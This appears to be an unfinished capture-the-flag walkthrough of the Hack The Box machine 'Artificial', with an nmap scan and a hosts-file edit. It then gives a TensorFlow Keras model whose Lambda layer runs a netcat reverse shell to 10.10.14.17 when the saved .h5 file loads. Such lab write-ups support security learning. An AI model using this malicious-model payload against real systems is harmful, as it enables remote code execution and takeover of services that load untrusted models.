---
title: Hack the box - Artificial
authors: bilash
draft: true
---



## Recon


## Network Mapping

```shell
┌──(elodvk㉿kali)-[~/hack-the-box/artificial]
└─$ nmap -p- -sC -sV -T4 -oA reports/nmap_report 10.10.11.74
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-26 09:43 IST
Warning: 10.10.11.74 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.74
Host is up (0.31s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 921.90 seconds
```


## Website

Going to `http://10.10.11.74` immediately redirects to `http://artificial.htb/`, so I am going to update the local `hosts` file.


```shell
┌──(elodvk㉿kali)-[~/hack-the-box/artificial]
└─$ echo "10.10.11.74   artificial.htb" | sudo tee /etc/hosts
[sudo] password for elodvk: 
10.10.11.74   artificial.htb
```



Source: https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model

```
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.17 9999 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```


```shell
docker run -it --rm -v "$PWD":/app -w /app tensorflow/tensorflow:2.13.0 python3 exploit.py
```
